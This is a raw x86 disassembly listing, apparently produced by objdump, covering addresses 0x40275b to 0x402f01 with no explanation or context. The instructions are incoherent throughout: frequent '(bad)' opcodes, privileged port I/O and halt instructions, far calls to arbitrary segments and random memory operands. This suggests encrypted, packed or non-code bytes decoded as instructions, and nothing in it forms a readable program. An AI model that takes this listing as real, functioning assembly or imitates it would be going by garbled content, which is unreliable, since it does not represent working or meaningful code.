  40275b:	(bad)  
  40275c:	xor    eax,0xa5cecde2
  402761:	xor    al,0xde
  402763:	dec    ebx
  402764:	mov    dl,0x7
  402766:	xor    DWORD PTR [edi-0x46938dad],edx
  40276c:	aaa    
  40276d:	repz stc 
  40276f:	daa    
  402770:	sar    eax,0x3f
  402773:	popf   
  402774:	sub    dl,bl
  402776:	call   0x5828:0x9efc503e
  40277d:	xlat   BYTE PTR ds:[ebx]
  40277e:	mov    esp,DWORD PTR [edi+0x5caeadcb]
  402784:	iret   
  402785:	dec    ecx
  402786:	xor    bl,BYTE PTR [edx]
  402788:	mov    dl,0xf4
  40278a:	call   0xc26e2526
  40278f:	adc    eax,ebx
  402791:	jb     0x402718
  402793:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402794:	xor    esp,ebx
  402796:	mov    dh,0xaa
  402798:	adc    DWORD PTR [ebp+0x51b3542f],edx
  40279e:	bound  edi,QWORD PTR [edi+eax*2+0x46dfde9e]
  4027a5:	sar    esp,1
  4027a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027a8:	aaa    
  4027a9:	push   es
  4027aa:	or     ebp,DWORD PTR [ecx+0x49cc366f]
  4027b0:	mov    ebp,0x40a11065
  4027b5:	jmp    0x4027c0
  4027b7:	mov    bh,bh
  4027b9:	fisubr DWORD PTR [ecx+0x54191ba7]
  4027bf:	push   eax
  4027c0:	icebp  
  4027c1:	mov    ebp,0xb0b2aef3
  4027c6:	xor    dh,BYTE PTR [esi]
  4027c8:	jmp    0x40275b
  4027ca:	push   ebp
  4027cb:	xchg   ebx,eax
  4027cc:	nop
  4027cd:	push   ss
  4027ce:	mov    dl,BYTE PTR [edi-0x57]
  4027d1:	or     ebx,DWORD PTR [ebx+0x53]
  4027d4:	mov    DWORD PTR [esi],edi
  4027d6:	adc    bh,cl
  4027d8:	mov    al,0xc
  4027da:	and    bl,al
  4027dc:	pusha  
  4027dd:	push   es
  4027de:	stc    
  4027df:	(bad)  
  4027e0:	jmp    0x402783
  4027e2:	jns    0x40276d
  4027e4:	outs   dx,DWORD PTR ds:[esi]
  4027e5:	mov    al,0xed
  4027e7:	mov    ds:0x27e8c625,al
  4027ec:	aas    
  4027ed:	dec    edi
  4027ee:	fnstsw WORD PTR [ebp-0x4e]
  4027f1:	xchg   ebx,eax
  4027f2:	push   0x71
  4027f4:	mul    DWORD PTR [edi+eax*2]
  4027f7:	dec    eax
  4027f8:	add    DWORD PTR [edx+ecx*8],0xba31ee35
  4027ff:	dec    ebx
  402800:	dec    ecx
  402801:	xchg   al,dh
  402803:	sub    BYTE PTR [ebp-0x62940e0b],cl
  402809:	or     ecx,DWORD PTR [ecx-0x5b]
  40280c:	ins    DWORD PTR es:[edi],dx
  40280d:	dec    ebx
  40280e:	retf   0x41bc
  402811:	or     ebp,DWORD PTR [ecx]
  402813:	rcr    DWORD PTR [eax-0x44129cf],cl
  402819:	neg    DWORD PTR [edx+0x93019e2]
  40281f:	sub    ch,BYTE PTR [edi-0x6b588977]
  402825:	popa   
  402826:	mov    BYTE PTR [eax],bl
  402828:	jg     0x4027dc
  40282a:	and    DWORD PTR [ecx-0x53],eax
  40282d:	xchg   esp,eax
  40282e:	mov    bh,0xc0
  402830:	mov    cl,0x9b
  402832:	push   eax
  402833:	jae    0x40287a
  402835:	(bad)  [ecx-0x73]
  402838:	mov    esi,0xe4f3130c
  40283d:	mov    ebp,0x307347d3
  402842:	sahf   
  402843:	int    0xb5
  402845:	lods   al,BYTE PTR ds:[esi]
  402846:	out    dx,eax
  402847:	pop    edx
  402848:	clc    
  402849:	cli    
  40284a:	call   0xab45:0x144ca4d0
  402851:	or     BYTE PTR [ecx],bl
  402853:	jne    0x402871
  402855:	and    ch,ah
  402857:	pusha  
  402858:	push   0xffffff9b
  40285a:	shl    ch,0xb1
  40285d:	ins    DWORD PTR es:[edi],dx
  40285e:	pop    esp
  40285f:	fisttp QWORD PTR [eax+0x5437cb37]
  402865:	ss out dx,eax
  402867:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402868:	mov    bl,0xd0
  40286a:	xor    bl,ah
  40286c:	loope  0x402894
  40286e:	push   0xffffffaf
  402870:	mov    bl,0xfd
  402872:	adc    BYTE PTR [ebp-0x2c81a95],bl
  402878:	push   esi
  402879:	loope  0x4027fc
  40287b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40287c:	jb     0x40286a
  40287e:	ds retf 
  402880:	mov    ebx,0xb3ee7bed
  402885:	and    cl,BYTE PTR [esi]
  402887:	mov    bl,0xaf
  402889:	cmp    al,0xa0
  40288b:	rol    BYTE PTR ds:[edx+edx*8+0x7e1990d0],cl
  402893:	cmp    DWORD PTR [ebx],0x68fb310b
  402899:	mov    bl,0xc9
  40289b:	imul   ecx,DWORD PTR [eax-0x1e],0x304ea16c
  4028a2:	popf   
  4028a3:	and    DWORD PTR [edx+0x5c986c11],esp
  4028a9:	retf   
  4028aa:	cmp    BYTE PTR [ecx+0x66],0x77
  4028ae:	lea    esp,[edi-0x41c9ba09]
  4028b4:	cwde   
  4028b5:	cs (bad) 
  4028b7:	int3   
  4028b8:	leave  
  4028b9:	and    ebx,DWORD PTR [edx+0x3858600]
  4028bf:	xchg   DWORD PTR [ebx-0x85830e9],esp
  4028c5:	stos   DWORD PTR es:[edi],eax
  4028c6:	push   esi
  4028c7:	inc    eax
  4028c8:	jecxz  0x402859
  4028ca:	retf   0xb388
  4028cd:	jno    0x4028ea
  4028cf:	mov    DWORD PTR [eax+ecx*2],esi
  4028d2:	xchg   esp,eax
  4028d3:	xchg   ebx,eax
  4028d4:	push   0x4a
  4028d6:	sbb    bl,BYTE PTR [edi+0x2d14d505]
  4028dc:	sub    al,0xb2
  4028de:	pop    ebx
  4028df:	(bad)  
  4028e0:	push   es
  4028e1:	jl     0x402937
  4028e3:	(bad)  
  4028e4:	ja     0x402911
  4028e6:	call   0x3859:0xa51e48c2
  4028ed:	stos   BYTE PTR es:[edi],al
  4028ee:	jle    0x402890
  4028f0:	pop    ss
  4028f1:	mov    dh,0xec
  4028f3:	out    0x15,al
  4028f5:	dec    ebx
  4028f6:	inc    esp
  4028f7:	dec    ebx
  4028f8:	ficom  DWORD PTR [eax]
  4028fa:	fwait
  4028fb:	ja     0x402944
  4028fd:	sbb    eax,DWORD PTR [edi-0x60]
  402900:	(bad)  
  402901:	xlat   BYTE PTR ds:[ebx]
  402902:	stos   BYTE PTR es:[edi],al
  402903:	lea    ebx,[edi]
  402905:	push   ss
  402906:	adc    eax,0x424811f5
  40290b:	mov    ds:0x1a21ff63,eax
  402910:	push   edx
  402911:	mov    al,0x2c
  402913:	aaa    
  402914:	mov    dl,0x0
  402916:	pop    edx
  402917:	mov    dl,0x94
  402919:	jp     0x4028c8
  40291b:	ja     0x40293a
  40291d:	lock pop ebx
  40291f:	out    dx,al
  402920:	sbb    BYTE PTR [esi+0x73],0xa7
  402924:	pop    es
  402925:	adc    BYTE PTR ds:0xe6fe43d2,dl
  40292b:	sbb    BYTE PTR [ecx+0x56add6d9],dh
  402931:	sbb    BYTE PTR [esi],al
  402933:	aas    
  402934:	aaa    
  402935:	sub    ebp,DWORD PTR [edi-0x57a75559]
  40293b:	cld    
  40293c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40293d:	xchg   ebx,eax
  40293e:	xor    eax,0x45b76f97
  402943:	add    edx,esi
  402945:	bound  esp,QWORD PTR [edx]
  402947:	in     eax,0x50
  402949:	ficom  WORD PTR [edx]
  40294b:	inc    ebx
  40294c:	mov    esp,0xf6df690f
  402951:	xor    dl,ch
  402953:	scas   al,BYTE PTR es:[di]
  402955:	fistp  DWORD PTR [ecx]
  402957:	mov    esp,0xfcfae3b2
  40295c:	test   al,0xdd
  40295e:	in     eax,dx
  40295f:	adc    eax,0x37560bd7
  402964:	sub    DWORD PTR [eax+0x7c],eax
  402967:	jle    0x40292a
  402969:	mov    BYTE PTR [edx+0x779d718d],bl
  40296f:	and    esi,DWORD PTR [ebp-0x57]
  402972:	pop    esp
  402973:	pop    ebp
  402974:	sbb    ecx,DWORD PTR [ebx]
  402976:	mov    ds:0x6dca0efb,al
  40297b:	and    BYTE PTR [ebx],al
  40297d:	loope  0x402913
  40297f:	cld    
  402980:	add    bl,dl
  402982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402983:	inc    edi
  402984:	fidiv  WORD PTR [ebx-0xb]
  402987:	dec    esp
  402988:	and    eax,0xcb92e50b
  40298d:	(bad)  
  40298e:	push   ecx
  40298f:	mov    dh,0x92
  402991:	lahf   
  402992:	call   0x8a13:0x38445ab2
  402999:	mov    esp,0x14744fd3
  40299e:	cmp    eax,0x2cb48b4
  4029a3:	fadd   st,st(5)
  4029a5:	mov    dh,0x40
  4029a7:	inc    esp
  4029a8:	mov    dl,0x64
  4029aa:	out    dx,eax
  4029ab:	cld    
  4029ac:	enter  0x9c56,0xb6
  4029b0:	hlt    
  4029b1:	or     esi,DWORD PTR [edi]
  4029b3:	mov    ebp,0x13a8936f
  4029b8:	cli    
  4029b9:	push   edi
  4029ba:	out    0xeb,eax
  4029bc:	mov    ebp,0x87cd53fd
  4029c1:	add    al,0x1b
  4029c3:	inc    edi
  4029c4:	jne    0x402a31
  4029c6:	jp     0x402a30
  4029c8:	inc    edi
  4029c9:	icebp  
  4029ca:	shl    DWORD PTR [edi-0x4e7586eb],cl
  4029d0:	push   edi
  4029d1:	outs   dx,BYTE PTR ds:[esi]
  4029d2:	xchg   ebx,eax
  4029d3:	test   al,0xb3
  4029d5:	repz mov esp,0x9fbbac6f
  4029db:	inc    eax
  4029dc:	pop    edx
  4029dd:	xor    al,0x26
  4029df:	popf   
  4029e0:	inc    ecx
  4029e1:	push   0xb83ce79a
  4029e6:	or     eax,0x9a7e7c37
  4029eb:	stc    
  4029ec:	push   ebx
  4029ed:	loop   0x4029ba
  4029ef:	sbb    ebp,esp
  4029f1:	sub    eax,0xb08df1e
  4029f6:	retf   0x1ab2
  4029f9:	pusha  
  4029fa:	ja     0x402a70
  4029fc:	repz pop ss
  4029fe:	cdq    
  4029ff:	sahf   
  402a00:	mov    al,0xa
  402a02:	(bad)  
  402a03:	cmc    
  402a04:	dec    ecx
  402a05:	jecxz  0x402a38
  402a07:	cmp    DWORD PTR [edx+0xb],eax
  402a0a:	adc    al,BYTE PTR [ecx-0x2e80c307]
  402a10:	adc    DWORD PTR [ebp-0x7a],eax
  402a13:	std    
  402a14:	jne    0x402a0f
  402a16:	popa   
  402a17:	daa    
  402a18:	fs pusha 
  402a1a:	aad    0xf8
  402a1c:	push   edx
  402a1d:	push   0xe790a7a2
  402a22:	jl     0x4029f8
  402a24:	imul   esi,DWORD PTR [eax],0xffffff81
  402a27:	xor    eax,0xd8072fb2
  402a2c:	stos   DWORD PTR es:[edi],eax
  402a2d:	std    
  402a2e:	(bad)  
  402a2f:	out    0xd8,al
  402a31:	xor    bh,BYTE PTR [edx+0x6698ac0b]
  402a37:	and    edi,DWORD PTR [edi+0x7a676e4b]
  402a3d:	in     eax,dx
  402a3e:	add    DWORD PTR [ecx-0x4e],ebx
  402a41:	sahf   
  402a42:	push   es
  402a43:	cmp    eax,0x2034be0f
  402a48:	aam    0xb
  402a4a:	push   0x208e67e6
  402a4f:	cdq    
  402a50:	(bad)  
  402a51:	lahf   
  402a52:	call   0x6f57:0xcbc621d4
  402a59:	pop    eax
  402a5a:	pushf  
  402a5b:	fiadd  WORD PTR [ecx+0xb]
  402a5e:	lods   eax,DWORD PTR ds:[esi]
  402a5f:	mov    dl,0x78
  402a61:	call   0x4e5fbd3b
  402a66:	call   0xc249:0xae068f0e
  402a6d:	mov    ebx,DWORD PTR [esi-0x47e17759]
  402a73:	pop    eax
  402a74:	imul   BYTE PTR [esi]
  402a76:	ret    
  402a77:	xchg   DWORD PTR [edx+0x79d22266],esi
  402a7d:	idiv   DWORD PTR [edi]
  402a7f:	jns    0x402afe
  402a81:	jo     0x402a48
  402a83:	test   al,0xe0
  402a85:	outs   dx,DWORD PTR ds:[esi]
  402a86:	std    
  402a87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a88:	repnz inc ebx
  402a8a:	stos   DWORD PTR es:[edi],eax
  402a8b:	in     al,dx
  402a8c:	pusha  
  402a8d:	and    eax,0x17e86f9a
  402a92:	stos   BYTE PTR es:[edi],al
  402a93:	test   al,0xaa
  402a95:	imul   edx,DWORD PTR [ebx+ebx*4+0x2a9a5469],0xffffffdb
  402a9d:	call   0x2d4f1553
  402aa2:	retf   0x581e
  402aa5:	push   es
  402aa6:	xchg   ebp,eax
  402aa7:	jmp    0x402a4b
  402aa9:	mov    dl,dl
  402aab:	ret    0x154d
  402aae:	pop    edx
  402aaf:	pop    ds
  402ab0:	sub    DWORD PTR [ebx-0x23145871],0x19d93f58
  402aba:	xor    eax,0x16c1b262
  402abf:	icebp  
  402ac0:	sbb    bl,BYTE PTR [ecx+0x7d]
  402ac3:	mov    ds:0x959c0bc0,eax
  402ac8:	stos   DWORD PTR es:[edi],eax
  402ac9:	xor    ecx,ecx
  402acb:	in     eax,dx
  402acc:	and    cl,BYTE PTR [edx+ebx*4+0x11]
  402ad0:	and    BYTE PTR [esp+ebx*8-0x3b],ch
  402ad4:	sub    eax,0xd4d5c7ff
  402ad9:	or     ecx,DWORD PTR [ebp-0x71f1a818]
  402adf:	sbb    eax,0x709ac303
  402ae4:	xchg   esi,eax
  402ae5:	inc    ebx
  402ae6:	and    dh,BYTE PTR [ecx]
  402ae8:	pop    ss
  402ae9:	xchg   edx,eax
  402aea:	mov    bl,BYTE PTR [edx-0x3e]
  402aed:	retf   
  402aee:	pop    edx
  402aef:	mov    ds:0x474efce4,al
  402af4:	leave  
  402af5:	mov    ebx,DWORD PTR [ebp-0x65b49486]
  402afb:	jmp    0x6529ae94
  402b00:	sbb    ebp,edi
  402b02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b04:	push   ss
  402b05:	jge    0x402aaa
  402b07:	mov    ds:0x735fbbb5,al
  402b0c:	mov    dl,0x2
  402b0e:	outs   dx,BYTE PTR ds:[esi]
  402b0f:	pop    ebx
  402b10:	adc    al,0x29
  402b12:	inc    ecx
  402b13:	fstp   DWORD PTR [eax+0x10fa990b]
  402b19:	in     al,dx
  402b1a:	sub    BYTE PTR ds:0xb9a7007,ah
  402b20:	fsubrp st(5),st
  402b22:	out    dx,eax
  402b23:	out    dx,eax
  402b24:	arpl   bx,di
  402b26:	loopne 0x402ae2
  402b28:	scas   al,BYTE PTR es:[edi]
  402b29:	aad    0x71
  402b2b:	lea    ebp,fs:[esi+0x2a]
  402b2f:	jp     0x402b6e
  402b31:	pop    ebx
  402b32:	mov    edi,0x9aefeeb6
  402b37:	in     al,dx
  402b38:	cmp    edi,edi
  402b3a:	jp     0x402b3c
  402b3c:	es pushf 
  402b3e:	inc    ebx
  402b3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b40:	mov    bl,0xd8
  402b42:	(bad)  
  402b43:	cmc    
  402b44:	hlt    
  402b45:	pusha  
  402b46:	stos   BYTE PTR es:[edi],al
  402b47:	jae    0x402afb
  402b49:	push   ss
  402b4a:	pop    es
  402b4b:	popf   
  402b4c:	jae    0x402bc5
  402b4e:	hlt    
  402b4f:	test   al,0x6d
  402b51:	or     edx,DWORD PTR [esi+eax*8]
  402b54:	repz mov esp,0xb662ff21
  402b5a:	call   0x6fab:0x80a5aca
  402b61:	rol    BYTE PTR [ecx],0xa4
  402b64:	mov    BYTE PTR [edi+0xa],ah
  402b67:	pop    ecx
  402b68:	das    
  402b69:	mov    esp,0x41e62b42
  402b6e:	popf   
  402b6f:	(bad)  
  402b70:	fwait
  402b71:	add    bl,0xf6
  402b74:	daa    
  402b75:	rcr    BYTE PTR [edx+0x47],cl
  402b78:	int    0x97
  402b7a:	outs   dx,BYTE PTR ds:[esi]
  402b7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b7c:	es dec esi
  402b7e:	xor    BYTE PTR [edx+0x4c],al
  402b81:	inc    edi
  402b82:	add    WORD PTR [esi+0x78],0xff9a
  402b87:	fsubrp st(5),st
  402b89:	stc    
  402b8a:	adc    bl,BYTE PTR [esi-0x7]
  402b8d:	push   edi
  402b8e:	jae    0x402b37
  402b90:	push   0xc201555d
  402b95:	test   BYTE PTR [eax+0x619bb279],dh
  402b9b:	fst    DWORD PTR [esi+0x65]
  402b9e:	sub    ah,BYTE PTR [esi+0x17]
  402ba1:	aaa    
  402ba2:	out    dx,eax
  402ba3:	int    0x32
  402ba5:	xchg   edx,eax
  402ba6:	das    
  402ba7:	out    0x33,al
  402ba9:	xlat   BYTE PTR ds:[ebx]
  402baa:	add    DWORD PTR [ebx-0x51],ecx
  402bad:	or     al,BYTE PTR [edi+0x54]
  402bb0:	jb     0x402b61
  402bb2:	jmp    0xde3f:0x63f7df16
  402bb9:	or     eax,DWORD PTR [ebp+0x11]
  402bbc:	adc    ebx,esp
  402bbe:	cmp    eax,0x95d0a6cf
  402bc3:	(bad)  
  402bc4:	sbb    al,0x69
  402bc6:	out    dx,al
  402bc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bc8:	or     edi,ecx
  402bca:	adc    esi,DWORD PTR [esp+ebp*8+0xb]
  402bce:	lods   al,BYTE PTR ds:[esi]
  402bcf:	test   al,0xc7
  402bd1:	mov    ah,0x3c
  402bd3:	pop    es
  402bd4:	jmp    0x402bf9
  402bd6:	pusha  
  402bd7:	mov    esp,0xf706ddb2
  402bdc:	ds jno 0x402bac
  402bdf:	popa   
  402be0:	dec    BYTE PTR [ebx]
  402be2:	xor    al,0x59
  402be4:	lds    esp,FWORD PTR [eax]
  402be6:	pusha  
  402be7:	xchg   esp,eax
  402be8:	jge    0x402bb6
  402bea:	fwait
  402beb:	sub    bl,BYTE PTR [eax-0x4d]
  402bee:	(bad)  
  402bef:	jecxz  0x402b97
  402bf1:	stc    
  402bf2:	dec    esi
  402bf3:	mov    esi,0xb7ac2504
  402bf8:	or     eax,DWORD PTR ds:0x52b274ce
  402bfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bff:	xchg   esp,eax
  402c00:	int3   
  402c01:	js     0x402baa
  402c03:	iret   
  402c04:	sbb    BYTE PTR [ebx],cl
  402c06:	int    0x92
  402c08:	mov    edx,0x45096720
  402c0d:	or     esp,DWORD PTR [eax+0x73]
  402c10:	or     ecx,eax
  402c12:	ins    BYTE PTR es:[edi],dx
  402c13:	(bad)
  402c16:	xchg   bh,ah
  402c18:	(bad)  
  402c19:	sbb    bl,BYTE PTR [ebx-0x4]
  402c1c:	shr    BYTE PTR [ecx+0x747ae4fd],cl
  402c22:	mov    fs,WORD PTR [edi-0x56068957]
  402c28:	loop   0x402c70
  402c2a:	and    al,0x6f
  402c2c:	mov    dl,0x4
  402c2e:	stos   BYTE PTR es:[edi],al
  402c2f:	or     al,0x1e
  402c31:	push   edi
  402c32:	cmp    BYTE PTR [edi],0x36
  402c35:	or     ebp,DWORD PTR [ebx+esi*1-0x61241bd0]
  402c3c:	mov    DWORD PTR [esi+0x2],ebx
  402c3f:	das    
  402c40:	mov    ebx,0x5b9d989a
  402c45:	or     ecx,ecx
  402c47:	fcom   DWORD PTR [ecx+0x11]
  402c4a:	and    eax,0xa643a5a7
  402c4f:	aam    0xec
  402c51:	fbstp  TBYTE PTR [ebx]
  402c53:	repnz mov dl,0x64
  402c56:	aas    
  402c57:	cmp    edi,DWORD PTR [ecx+0x6d]
  402c5a:	(bad)  
  402c5b:	rcl    BYTE PTR [ebp+edx*1+0x2f],1
  402c5f:	out    0xde,eax
  402c61:	retf   
  402c62:	add    eax,0xafdb0450
  402c67:	jp     0x402c1b
  402c69:	mov    edx,0x57997116
  402c6e:	jbe    0x402c5f
  402c70:	xchg   ebp,eax
  402c71:	or     ebx,DWORD PTR ds:0xb7eb890a
  402c77:	ret    0xe344
  402c7a:	call   0x3814:0x16ca46e9
  402c81:	add    ch,BYTE PTR [ecx-0x59]
  402c84:	pop    eax
  402c85:	dec    edi
  402c86:	xchg   edx,eax
  402c87:	xchg   esi,eax
  402c88:	pop    ds
  402c89:	or     al,0x1a
  402c8b:	mov    ?,WORD PTR [edi+0x1a7dc26c]
  402c91:	sub    bl,BYTE PTR [edx-0x4c]
  402c94:	lea    esp,[eax-0x95f5853]
  402c9a:	or     esi,DWORD PTR [edi-0x7c0804d2]
  402ca0:	mov    dl,0x4b
  402ca2:	lock ret 0x3a72
  402ca6:	push   eax
  402ca7:	lahf   
  402ca8:	lds    ecx,FWORD PTR [ebx]
  402caa:	mov    eax,ds:0x436c2eae
  402cb0:	pop    ecx
  402cb1:	or     BYTE PTR [edx-0x28f58b92],bl
  402cb7:	cmc    
  402cb8:	ins    DWORD PTR es:[edi],dx
  402cb9:	fimul  WORD PTR [ebx-0x525ddf59]
  402cbf:	icebp  
  402cc0:	xor    dl,BYTE PTR [ebp+0x7]
  402cc3:	fidiv  WORD PTR [ecx-0x381a3640]
  402cc9:	mov    edx,0xd023040
  402cce:	loop   0x402d0e
  402cd0:	mov    eax,0x54522f08
  402cd5:	test   bh,bl
  402cd7:	les    esp,FWORD PTR [edx-0xa]
  402cda:	lods   al,BYTE PTR ds:[esi]
  402cdb:	inc    ebp
  402cdc:	mov    cl,0x9a
  402cde:	inc    ebx
  402cdf:	cld    
  402ce0:	leave  
  402ce1:	loope  0x402cf5
  402ce3:	pop    ds
  402ce4:	(bad)  
  402ce5:	cmp    BYTE PTR [edx+0x2ad5d0a7],cl
  402ceb:	push   esp
  402cec:	push   esp
  402ced:	out    dx,al
  402cee:	fild   QWORD PTR [bx+0x2099]
  402cf3:	loopne 0x402d27
  402cf5:	das    
  402cf6:	jae    0x402d5d
  402cf8:	push   eax
  402cf9:	xor    ebp,edx
  402cfb:	test   al,0x87
  402cfd:	enter  0x788b,0xf2
  402d01:	jecxz  0x402c97
  402d03:	mov    bl,0xe0
  402d05:	sti    
  402d06:	cdq    
  402d07:	retf   
  402d08:	adc    eax,0xf60c9c74
  402d0d:	stos   DWORD PTR es:[edi],eax
  402d0e:	fild   WORD PTR [ebp+0x47d20b67]
  402d14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d15:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  402d17:	fild   QWORD PTR [ecx-0x79b46563]
  402d1d:	idiv   esp
  402d1f:	sbb    ah,bl
  402d21:	nop
  402d22:	push   ds
  402d23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d24:	cmp    DWORD PTR [ebx+0x2da0dc5],edi
  402d2a:	imul   ebx,DWORD PTR [ebx],0xffffffb5
  402d2d:	cmp    al,0xd0
  402d2f:	pop    ecx
  402d30:	fsub   QWORD PTR [ecx-0x37]
  402d33:	pop    ds
  402d34:	and    BYTE PTR [edx+edi*2+0x5f61017],0xa7
  402d3c:	icebp  
  402d3d:	jmp    0x92dbf54c
  402d42:	or     BYTE PTR [ecx-0x72],bl
  402d45:	retf   0x27fd
  402d48:	sbb    al,0x67
  402d4a:	out    0x3,eax
  402d4c:	mov    ds:0x225bec87,eax
  402d51:	or     ebp,DWORD PTR [esi-0x261250f5]
  402d57:	and    al,0x6c
  402d59:	stc    
  402d5a:	call   0xe0ef:0x57e655f0
  402d61:	add    bl,BYTE PTR [esi-0x59]
  402d64:	and    esi,ecx
  402d66:	inc    ebx
  402d67:	test   bh,dl
  402d69:	pop    es
  402d6a:	lea    edx,[ecx+0x75ae0b2]
  402d70:	mov    bl,0xc
  402d72:	(bad)  
  402d74:	xchg   esi,eax
  402d75:	jb     0x402ddd
  402d77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d78:	xor    ah,BYTE PTR [esi-0x7d]
  402d7b:	sub    eax,0x4b4ae276
  402d80:	dec    ebx
  402d81:	mov    esi,0x7b17bea
  402d86:	and    ebp,DWORD PTR [edi+0x176a9b16]
  402d8c:	int3   
  402d8d:	mov    ah,0x98
  402d8f:	push   ebp
  402d90:	in     eax,dx
  402d91:	je     0x402dee
  402d93:	mov    ebx,0xa8094457
  402d98:	sbb    BYTE PTR [eax],bh
  402d9a:	jp     0x402d57
  402d9c:	ret    0x3b13
  402d9f:	inc    esp
  402da0:	iret   
  402da1:	adc    bl,BYTE PTR [ecx-0x373f64bb]
  402da7:	loopne 0x402dec
  402da9:	sar    BYTE PTR [ebx+0x1acdb51e],0xa3
  402db0:	mov    WORD PTR [edi],fs
  402db2:	xchg   ecx,eax
  402db3:	mov    bh,0x3f
  402db5:	fcomp  QWORD PTR [edx-0x5e213aff]
  402dbb:	fiadd  DWORD PTR [ebx-0x4058a5b5]
  402dc1:	and    BYTE PTR [ecx+0x75],dh
  402dc4:	jmp    0xb2d0fa0e
  402dc9:	push   ebx
  402dca:	xor    esi,edi
  402dcc:	and    al,0x65
  402dce:	shl    BYTE PTR [edi+0x1f],1
  402dd1:	xor    BYTE PTR [edi],bh
  402dd3:	aad    0xb2
  402dd5:	sub    al,0x8
  402dd7:	mov    cs,WORD PTR [eax+0x1]
  402dda:	int3   
  402ddb:	sbb    eax,0xd275c7b5
  402de0:	push   esp
  402de1:	mov    ebp,0xcbdde349
  402de6:	shl    DWORD PTR [ebx-0x841f47e],0x8f
  402ded:	sbb    al,0x6a
  402def:	jae    0x402e05
  402df1:	call   0x2193:0x2d7a359a
  402df8:	out    0x5d,eax
  402dfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402dfb:	mov    ebx,0xe7a4be02
  402e00:	pop    ebp
  402e01:	mov    bh,0xea
  402e03:	ins    DWORD PTR es:[edi],dx
  402e04:	bndldx bnd3,[edx+0x61490145]
  402e0b:	mov    ds:0xbacd6ac4,eax
  402e10:	gs lahf 
  402e12:	stos   DWORD PTR es:[edi],eax
  402e13:	and    al,0x75
  402e15:	inc    ebx
  402e16:	in     eax,dx
  402e17:	or     ch,BYTE PTR [edx-0x45]
  402e1a:	cld    
  402e1b:	or     al,0xbb
  402e1d:	push   esi
  402e1e:	or     esi,ebp
  402e20:	dec    ebx
  402e21:	or     esi,ecx
  402e23:	outs   dx,DWORD PTR ds:[esi]
  402e24:	pop    DWORD PTR [ebp+ebp*1-0x59]
  402e28:	dec    edx
  402e29:	adc    ch,cl
  402e2b:	js     0x402e72
  402e2d:	data16 fst DWORD PTR [edx+0x54]
  402e31:	inc    edi
  402e32:	call   0xf053:0x1a07ace2
  402e39:	arpl   sp,sp
  402e3b:	xlat   BYTE PTR ds:[ebx]
  402e3c:	jnp    0x402e49
  402e3e:	dec    esi
  402e3f:	jg     0x402e23
  402e41:	push   esp
  402e42:	mov    ah,0x1e
  402e44:	repz mov ah,0x9a
  402e47:	jo     0x402df7
  402e49:	stos   BYTE PTR es:[edi],al
  402e4a:	mov    bh,0x96
  402e4c:	call   FWORD PTR [esi+0x68]
  402e4f:	scas   al,BYTE PTR es:[edi]
  402e50:	sub    DWORD PTR [ecx+0x3b2d212],esi
  402e56:	sbb    eax,0x9f192a2e
  402e5b:	cwde   
  402e5c:	nop
  402e5d:	ss xchg esi,edx
  402e60:	xor    ah,BYTE PTR [ebx+0xbab37ab]
  402e66:	leave  
  402e67:	out    0xb7,eax
  402e69:	stc    
  402e6a:	imul   ebp,DWORD PTR ds:0xb699096d,0x56
  402e71:	clc    
  402e72:	xchg   esp,eax
  402e73:	mov    gs,WORD PTR [ebx-0x7c]
  402e76:	shl    DWORD PTR [eax],cl
  402e78:	mov    ecx,0x27a704d5
  402e7d:	pop    ecx
  402e7e:	call   FWORD PTR [ebx]
  402e80:	xchg   BYTE PTR [ebx],cl
  402e82:	mov    ch,0x52
  402e84:	xor    al,0x5b
  402e86:	cmp    al,BYTE PTR [esi+edi*4-0x7aac65f8]
  402e8d:	ror    DWORD PTR [esi+0x3a],cl
  402e90:	adc    BYTE PTR [ebx-0x21],dl
  402e93:	(bad)  
  402e94:	pushf  
  402e95:	or     esi,eax
  402e97:	mov    eax,DWORD PTR [eax]
  402e99:	popf   
  402e9a:	and    DWORD PTR [ebx],0xffffff95
  402e9d:	mov    bh,0x9a
  402e9f:	add    DWORD PTR [ecx-0x62],esp
  402ea2:	aas    
  402ea3:	fld    QWORD PTR [ecx+0x4e]
  402ea6:	shr    DWORD PTR [eax+0x55d70ea9],1
  402eac:	xor    dl,BYTE PTR [edx]
  402eae:	sahf   
  402eaf:	xchg   esi,eax
  402eb0:	sbb    al,0x9
  402eb2:	call   0x8930:0xa3076419
  402eb9:	cmp    edi,DWORD PTR [edx]
  402ebb:	pushf  
  402ebc:	push   0xb8c11a82
  402ec1:	push   0x5c
  402ec3:	push   ds
  402ec4:	push   eax
  402ec5:	repz call 0x3730:0xc7f0864a
  402ecd:	pop    ss
  402ece:	pop    edx
  402ecf:	out    dx,eax
  402ed0:	mov    bl,0x9c
  402ed2:	call   0x1955:0xe2cde780
  402ed9:	sbb    eax,0xec17769a
  402ede:	or     DWORD PTR [eax+0x55beb1e2],ebx
  402ee4:	lds    edx,FWORD PTR ds:0x8bb33d39
  402eea:	mov    ?,ecx
  402eec:	xor    BYTE PTR [edx],dl
  402eee:	iret   
  402eef:	pushf  
  402ef0:	mov    dl,0x80
  402ef2:	mov    cl,0x19
  402ef4:	sub    DWORD PTR [ebp-0x61],edi
  402ef7:	into   
  402ef8:	jne    0x402f72
  402efa:	inc    ecx
  402efb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402efc:	adc    bh,BYTE PTR [eax+0x4b]
  402eff:	jns    0x402f52
  402f01:	aaa    
